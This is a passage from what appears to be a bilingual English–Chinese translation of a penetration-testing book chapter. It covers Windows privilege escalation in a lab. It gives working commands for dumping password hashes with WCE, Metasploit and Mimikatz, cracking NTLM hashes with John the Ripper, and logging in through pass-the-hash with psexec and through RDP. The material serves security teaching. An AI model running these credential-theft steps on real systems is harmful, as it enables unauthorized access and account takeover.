  zh: '![图 7.18 – WCE 哈希](Images/B17389_07_016.jpg)'
- en: '](Images/B17389_07_018.jpg)'
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_018.jpg)'
- en: Figure 7.18 – WCE hashes
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.18 – WCE 哈希
- en: In this particular case, we were only able to dump the hashes for the currently
    logged on users.
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们只能提取当前登录用户的哈希值。
- en: 'We can also use the **wce.exe** binary to dump the password hashes and their
    corresponding cleartext equivalents. This can be done by running the following
    command:'
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以使用 **wce.exe** 二进制文件来提取密码哈希及其对应的明文。这可以通过运行以下命令来完成：
- en: .\wce64.exe -w
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: .\wce64.exe -w
- en: 'In this particular case, we retrieved the hashes and cleartext passwords for
    the vagrant user and the SSH user, as shown in the following screenshot:'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们获取了 vagrant 用户和 SSH 用户的哈希值和明文密码，如以下截图所示：
- en: '![Figure 7.19 – WCE cleartext passwords'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.19 – WCE 明文密码](Images/B17389_07_019.jpg)'
- en: '](Images/B17389_07_019.jpg)'
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_019.jpg)'
- en: Figure 7.19 – WCE cleartext passwords
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.19 – WCE 明文密码
- en: 'We can also use another great Metasploit post-exploitation module to dump password
    hashes and access tokens from the system. This can be done by loading the following
    module after putting your meterpreter session in the background:'
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以使用另一个很棒的 Metasploit 后渗透模块，从系统中提取密码哈希和访问令牌。将 Meterpreter 会话放到后台后，可以加载以下模块来执行此操作：
- en: use post/windows/gather/credential/credential_collector
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: use post/windows/gather/credential/credential_collector
- en: 'Now, we need to configure the module and change the relevant module options.
    In this case, the only option that needs to be configured is the **SESSION** option.
    We can set the **SESSION** option by running the following command:'
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们需要配置该模块并更改相关的模块选项。在这种情况下，唯一需要配置的选项是**SESSION**选项。我们可以通过运行以下命令来设置**SESSION**选项：
- en: set SESSION <SESSION-ID>
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: set SESSION <SESSION-ID>
- en: 'The following screenshot outlines the module option that needs to be configured
    in order to run the module:'
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 以下截图概述了需要配置的模块选项，以便运行该模块：
- en: '![Figure 7.20 – Module options'
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.20 – 模块选项'
- en: '](Images/B17389_07_020.jpg)'
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_020.jpg)'
- en: Figure 7.20 – Module options
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.20 – 模块选项
- en: 'Now, we can run the module by running the following command in the Metasploit
    console:'
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以通过在 Metasploit 控制台中运行以下命令来启动该模块：
- en: run
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: run
- en: 'If successful, the module should output a list of password hashes and access
    tokens that can be utilized to elevate our privileges, as shown in the following
    screenshot:'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 如果成功，模块应该会输出一个包含密码哈希和访问令牌的列表，可以用来提升我们的权限，如下图所示：
- en: '![Figure 7.21 – Credential editor'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.21 – 凭证编辑器'
- en: '](Images/B17389_07_021.jpg)'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_021.jpg)'
- en: Figure 7.21 – Credential editor
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.21 – 凭证编辑器
- en: In this case, we obtained all the user account hashes from the target system.
    We will take a look at how to utilize these hashes in the next section.
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们从目标系统中获取了所有用户帐户的哈希值。接下来，我们将查看如何利用这些哈希值。
- en: Utilizing mimikatz
  id: totrans-270
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用 mimikatz
- en: 'We can also utilize the built-in Mimikatz meterpreter module (also known as
    kiwi). This can be loaded into meterpreter by running the following command:'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以使用内置的 Mimikatz Meterpreter 模块（也称为 kiwi）。可以通过运行以下命令将其加载到 Meterpreter 中：
- en: load kiwi
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: load kiwi
- en: 'Once the module has been loaded, we can dump the contents of the SAM database
    by running the following command in the meterpreter session:'
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 模块加载后，我们可以通过在 Meterpreter 会话中运行以下命令来转储 SAM 数据库的内容：
- en: lsa_dump_sam
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: lsa_dump_sam
- en: 'This will output a list of all user accounts and their corresponding NTLM hashes,
    as shown in the following screenshot:'
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: 这将输出所有用户帐户及其相应的 NTLM 哈希值，如下图所示：
- en: '![Figure 7.22 – Mimikatz hashes'
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.22 – Mimikatz 哈希'
- en: '](Images/B17389_07_022.jpg)'
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_022.jpg)'
- en: Figure 7.22 – Mimikatz hashes
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.22 – Mimikatz 哈希
- en: Note
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: Mimikatz is an open source application that allows attackers to view and save
    Windows authentication credentials for the purpose of privilege escalation.
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: Mimikatz 是一个开源应用程序，允许攻击者查看和保存 Windows 身份验证凭证，用于特权升级。
- en: 'Alternatively, you can utilize the Mimikatz executable that comes pre-packaged
    with Kali Linux. The binary will need to be run locally on the target system and
    can be automatically uploaded to the target through meterpreter by running the
    following command:'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 或者，你可以使用 Kali Linux 中预打包的 Mimikatz 可执行文件。该二进制文件需要在目标系统上本地运行，并可以通过 Meterpreter
    自动上传到目标系统，方法是运行以下命令：
- en: upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
- en: In the event you are using a standard command shell, you can use the **certutil**
    utility to transfer the binary to the target system.
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你使用的是标准命令 shell，可以使用**certutil**工具将二进制文件传输到目标系统。
- en: Note
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: Mimikatz requires an elevated shell in order to dump hashes.
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: Mimikatz 需要提升的 shell 才能转储哈希值。
- en: 'After transferring the binary to the target system, we can execute the binary
    by running the following command:'
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: 在将二进制文件传输到目标系统后，我们可以通过运行以下命令来执行该二进制文件：
- en: .\mimikatz.exe
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: .\mimikatz.exe
- en: 'After executing the binary, we will need elevated permissions in order to access
    the SAM database. This can be done by running the following commands within the
    Mimikatz prompt:'
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: 执行二进制文件后，我们需要提升权限才能访问 SAM 数据库。可以通过在 Mimikatz 提示符中运行以下命令来实现：
- en: token::elevate
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: token::elevate
- en: 'We can now dump the contents of the SAM database by running the following command
    in the Mimikatz prompt:'
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以通过在 Mimikatz 提示符中运行以下命令来转储 SAM 数据库的内容：
- en: lsadump_sam
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: lsadump_sam
- en: 'If successful, you should retrieve the dumped hashes from the SAM database,
    as highlighted in the following screenshot:'
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: 如果成功，你应该能从 SAM 数据库中检索到提取的哈希值，如下图所示：
- en: '![Figure 7.23 – Mimikatz hash dump'
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.23 – Mimikatz 哈希转储'
- en: '](Images/B17389_07_023.jpg)'
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_023.jpg)'
- en: Figure 7.23 – Mimikatz hash dump
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.23 – Mimikatz 哈希转储
- en: You should now have access to various password hashes for various accounts.
    However, the account we are interested in is the administrator account as it will
    provide us with a direct route to elevate our privileges to the highest level.
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: 现在你应该已经可以访问各种账户的密码哈希值了。然而，我们感兴趣的账户是管理员账户，因为它将为我们提供一个直接的途径，将我们的权限提升到最高级别。
- en: In the next section, we will begin the process of cracking the password hashes
    and learn how we can utilize the passwords for authentication.
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一部分，我们将开始破解密码哈希的过程，并学习如何利用这些密码进行身份验证。
- en: Cracking Windows hashes
  id: totrans-298
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 破解 Windows 哈希值
- en: We can now use the password hashes we dumped in the previous section for legitimate
    authentication. However, before we do that, we still need to crack these hashes
    to obtain the cleartext passwords.
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在可以使用前一部分中提取的密码哈希进行合法身份验证。然而，在此之前，我们仍然需要破解这些哈希值以获得明文密码。
- en: This section will be split into two main subsections. The first part will go
    over the process of cracking Windows password hashes with John the Ripper, while
    the second subsection will cover the process of authentication.
  id: totrans-300
  prefs: []
  type: TYPE_NORMAL
  zh: 本节将分为两个主要子部分。第一部分将介绍使用 John the Ripper 破解 Windows 密码哈希的过程，而第二部分将涵盖身份验证的过程。
- en: Before we can begin dumping and cracking password hashes, we need to take a
    look at the structure of a typical Windows hash.
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始提取和破解密码哈希之前，我们需要了解典型 Windows 哈希的结构。
- en: 'As highlighted in the following screenshot, the hash ID is broken down into
    four sections:'
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: 如下图所示，哈希 ID 被分为四个部分：
- en: '![Figure 7.24 – Hash structure'
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.24 – 哈希结构'
- en: '](Images/B17389_07_024.jpg)'
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_024.jpg)'
- en: Figure 7.24 – Hash structure
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.24 – 哈希结构
- en: 'The four sections can be further classified as follows:'
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: 这四个部分可以进一步分类如下：
- en: The first section is the username.
  id: totrans-307
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 第一部分是用户名。
- en: The second section is the unique RID.
  id: totrans-308
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 第二部分是唯一的 RID。
- en: The third section is the LM hash.
  id: totrans-309
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 第三部分是 LM 哈希值。
- en: The fourth section is the NTLM hash.
  id: totrans-310
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 第四部分是 NTLM 哈希值。
- en: Now that we understand what makes up a Windows hash, we can begin the hash cracking
    process.
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们了解了 Windows 哈希的组成部分，我们可以开始哈希破解过程。
- en: Cracking Windows hashes with John the Ripper
  id: totrans-312
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用 John the Ripper 破解 Windows 哈希值
- en: John the Ripper is an open source password security, auditing, and recovery
    utility that supports a large number of hashes and ciphers. In our case, we will
    be utilizing John the Ripper to crack Windows NTLM hashes.
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: John the Ripper 是一款开源的密码安全、审计和恢复工具，支持大量的哈希值和加密方式。在我们的案例中，我们将使用 John the Ripper
    破解 Windows NTLM 哈希值。
- en: John the Ripper comes pre-packaged with Kali Linux, and the first step involves
    saving the password hashes we dumped in the hash dumping section into a file on
    Kali Linux, preferably a **.txt** file.
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: John the Ripper 随 Kali Linux 一起预安装，第一步是将我们在哈希提取部分中提取的密码哈希保存到 Kali Linux 中的一个文件中，最好是
    **.txt** 文件。
- en: In our case, we will name the file **hashes.txt** and save the file on our **Desktop**
    directory on Kali Linux.
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的案例中，我们将文件命名为 **hashes.txt** 并将文件保存在 Kali Linux 的 **Desktop** 目录中。
- en: 'The contents of your file should like similar to the following:'
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 文件内容应与以下类似：
- en: '![Figure 7.25 – NTLM hashes'
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.25 – NTLM 哈希值'
- en: '](Images/B17389_07_025.jpg)'
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_025.jpg)'
- en: Figure 7.25 – NTLM hashes
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.25 – NTLM 哈希值
- en: Note
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: The NTLM hashes should not be on the same line, and no other text or strings
    should be included in the hash file.
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: NTLM 哈希值不应出现在同一行，哈希文件中不应包含其他文本或字符串。
- en: 'We can now begin the hash cracking process with John the Ripper by running
    the following command in Kali Linux:'
  id: totrans-322
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在可以通过在 Kali Linux 中运行以下命令来开始使用 John the Ripper 破解哈希值：
- en: sudo john –format=NT hashes.txt
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
  zh: sudo john –format=NT hashes.txt
- en: This will initiate the hash cracking process; any cracked hashes will be output
    with their corresponding password. It is important to note that, depending on
    the length and strength of the passwords, the cracking process may take a few
    minutes to a couple of hours or even days.
  id: totrans-324
  prefs: []
  type: TYPE_NORMAL
  zh: 这将启动哈希破解过程；任何破解成功的哈希值将与其对应的密码一起输出。需要注意的是，破解过程可能根据密码的长度和强度不同，可能需要几分钟到几个小时甚至几天的时间。
- en: You may also want to limit the number of hashes in the hash file to the hashes
    that are the most important, or even the hash for the administrator account.
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能还需要限制哈希文件中的哈希数量，只保留最重要的哈希，甚至是管理员账户的哈希。
- en: 'In this particular case, John cracked the hashes for the **Administrator**
    and **vagrant** user accounts, as highlighted in the following screenshot:'
  id: totrans-326
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个特定的案例中，John 破解了**管理员**和**vagrant**用户账户的哈希值，如以下截图所示：
- en: '![Figure 7.26 – Cracked hashes'
  id: totrans-327
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.26 – 破解的哈希值'
- en: '](Images/B17389_07_026.jpg)'
  id: totrans-328
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_026.jpg)'
- en: Figure 7.26 – Cracked hashes
  id: totrans-329
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.26 – 破解的哈希值
- en: Now that we have obtained the cleartext password for the administrator account,
    we can begin the authentication process.
  id: totrans-330
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已经获得了管理员账户的明文密码，可以开始身份验证过程。
- en: Authentication
  id: totrans-331
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 身份验证
- en: We can use the dumped hashes and cleartext passwords to authenticate with the
    target to obtain privileged access. This process can be facilitated through various
    techniques. We will be taking a look at some of them in this subsection.
  id: totrans-332
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以利用已导出的哈希和明文密码进行身份验证，从而获得特权访问。这个过程可以通过各种技术来实现。在本小节中，我们将讨论其中的一些方法。
- en: Using the pass the hash technique
  id: totrans-333
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用传递哈希技术
- en: The first technique we will be using is known as *pass the hash*. It involves
    authenticating with a target using the dumped hash – in this case, the administrator
    hash. This attack can be automated with a Metasploit module that leverages the
    **PsExec** command-line utility on Windows. This utility allows you to execute
    programs on remote systems.
  id: totrans-334
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用的第一个技术被称为*传递哈希*。它涉及使用已导出的哈希进行目标身份验证——在这个例子中是管理员哈希。这个攻击可以通过 Metasploit 模块自动化，该模块利用了
    Windows 上的**PsExec**命令行工具。该工具允许你在远程系统上执行程序。
- en: 'We can load the module in Metasploit after putting our meterpreter session
    in the background by running the following command:'
  id: totrans-335
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以在将 meterpreter 会话置于后台后，在 Metasploit 中加载该模块，方法是运行以下命令：
- en: use exploit/windows/smb/psexec
  id: totrans-336
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 exploit/windows/smb/psexec
- en: 'After loading the module, we need to configure the module options. In this
    case, we need to configure the **RHOSTS** option and configure the **Server Message
    Block** (**SMB**) credentials. We set **SMBUser** to **Administrator** and the
    **SMBPass** option to the administrator hash, as highlighted in the following
    screenshot:'
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: 加载模块后，我们需要配置模块选项。在这种情况下，我们需要配置**RHOSTS**选项，并配置**服务器消息块**（**SMB**）凭据。我们将**SMBUser**设置为**Administrator**，并将**SMBPass**选项设置为管理员哈希，如下截图所示：
- en: '![Figure 7.27 – psexec module options'
  id: totrans-338
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.27 – psexec 模块选项'
- en: '](Images/B17389_07_027.jpg)'
  id: totrans-339
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_027.jpg)'
- en: Figure 7.27 – psexec module options
  id: totrans-340
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.27 – psexec 模块选项
- en: 'After configuring the module options, we can launch the module by running the
    following command in the Metasploit console:'
  id: totrans-341
  prefs: []
  type: TYPE_NORMAL
  zh: 配置好模块选项后，我们可以通过在 Metasploit 控制台中运行以下命令来启动模块：
- en: run
  id: totrans-342
  prefs: []
  type: TYPE_NORMAL
  zh: 运行
- en: 'As highlighted in the following screenshot, if the module runs successfully,
    we should receive a meterpreter session with elevated privileges:'
  id: totrans-343
  prefs: []
  type: TYPE_NORMAL
  zh: 如下截图所示，如果模块成功运行，我们应该会收到一个具有提升权限的 meterpreter 会话：
- en: '![Figure 7.28 – Pass the hash was successful'
  id: totrans-344
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.28 – 传递哈希成功'
- en: '](Images/B17389_07_028.jpg)'
  id: totrans-345
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_028.jpg)'
- en: Figure 7.28 – Pass the hash was successful
  id: totrans-346
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.28 – 传递哈希成功
- en: With that, we've successfully elevated our privileges by utilizing password
    hashes.
  id: totrans-347
  prefs: []
  type: TYPE_NORMAL
  zh: 这样，我们就成功地利用密码哈希提升了我们的权限。
- en: Using Remmina
  id: totrans-348
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 使用 Remmina
- en: During the initial Nmap scan of our target, we identified the **Remote Desktop
    Protocol** (**RDP**) service running on the default configured port; that is,
    **3389**. We can utilize the cleartext password we cracked for the administrator
    account to authenticate with the server and initiate a remote desktop connection
    with elevated privileges.
  id: totrans-349
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们对目标进行初步的 Nmap 扫描时，发现**远程桌面协议**（**RDP**）服务运行在默认配置端口，也就是**3389**。我们可以利用破解出的管理员账户明文密码来进行身份验证，并与服务器建立具有提升权限的远程桌面连接。
- en: This can be facilitated by using an RDP client such as Remmina, which comes
    pre-packaged with Kali Linux.
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: 这可以通过使用像 Remmina 这样的 RDP 客户端来实现，Remmina 是 Kali Linux 中预装的工具。
- en: 'You can launch Remmina through the application launcher menu or through the
    Terminal. Once you''ve done this, you will need to enter the target IP address,
    as shown in the following screenshot:'
  id: totrans-351
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以通过应用启动菜单或通过终端启动 Remmina。完成后，你需要输入目标的 IP 地址，如下截图所示：
- en: '![Figure 7.29 – Remmina IP specification'
  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.29 – Remmina IP 配置'
- en: '](Images/B17389_07_029.jpg)'
  id: totrans-353
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_029.jpg)'
- en: Figure 7.29 – Remmina IP specification
  id: totrans-354
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.29 – Remmina IP 配置
- en: 'After specifying the target IP, you will be prompted to provide credentials
    for authentication. In this case, we will use the administrator credentials, as
    shown in the following screenshot:'
  id: totrans-355
  prefs: []
  type: TYPE_NORMAL
  zh: 在指定目标 IP 后，系统会提示你提供凭证进行身份验证。在这种情况下，我们将使用管理员凭证，如下图所示：
- en: '![Figure 7.30 – Remmina credentials](Images/B17389_07_030.jpg)'
  id: totrans-356
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.30 – Remmina 凭据](Images/B17389_07_030.jpg)'
- en: Figure 7.30 – Remmina credentials
  id: totrans-357
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.30 – Remmina 凭据
- en: 'If authentication is successful, we should receive a remote desktop session
    and should be logged in as the administrator account with elevated privileges,
    as highlighted in the following screenshot:'
  id: totrans-358
  prefs: []
  type: TYPE_NORMAL
  zh: 如果身份验证成功，我们应该会收到一个远程桌面会话，并且应该以管理员账户登录，并拥有提升的权限，如下图所示：
- en: '![Figure 7.31 – Remmina RDP session'
  id: totrans-359
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 7.31 – Remmina RDP 会话'
- en: '](Images/B17389_07_031.jpg)'
  id: totrans-360
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_07_031.jpg)'
- en: Figure 7.31 – Remmina RDP session
  id: totrans-361
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.31 – Remmina RDP 会话
- en: With that, we've successfully elevated our privileges with the passwords hashes
    we dumped and cracked.
  id: totrans-362
  prefs: []
  type: TYPE_NORMAL
  zh: 通过这些操作，我们已经成功地利用转储和破解的密码哈希值提升了权限。
- en: You should now be familiar with the process of searching for and identifying
    passwords in files, as well as the process of dumping and cracking Windows NTLM
    hashes for the purpose of elevating privileges.
  id: totrans-363
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，你应该已经熟悉了在文件中搜索和识别密码的过程，以及为了提升权限而转储和破解 Windows NTLM 哈希值的过程。
- en: Summary
  id: totrans-364
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we learned how to find and identify passwords in Windows configuration
    files, before looking at the various utilities that can be used to search for
    specific strings. We also touched on how to find and identify application passwords
    in configuration files, and how these credentials can be used to extend our domain
    of control. We ended this chapter by taking an in-depth look at how to dump Windows
    NTLM hashes and how to crack them to elevate our privileges.
  id: totrans-365
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们学习了如何在 Windows 配置文件中查找和识别密码，接着介绍了可以用于搜索特定字符串的各种工具。我们还讨论了如何在配置文件中查找和识别应用程序密码，以及如何使用这些凭证来扩展我们的控制范围。最后，我们深入探讨了如何转储
    Windows NTLM 哈希值以及如何破解它们以提升权限。
- en: In the next chapter, we will explore the process of privilege escalation through
    exploiting various Windows services.
  id: totrans-366
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将探讨通过利用各种 Windows 服务来提升权限的过程。
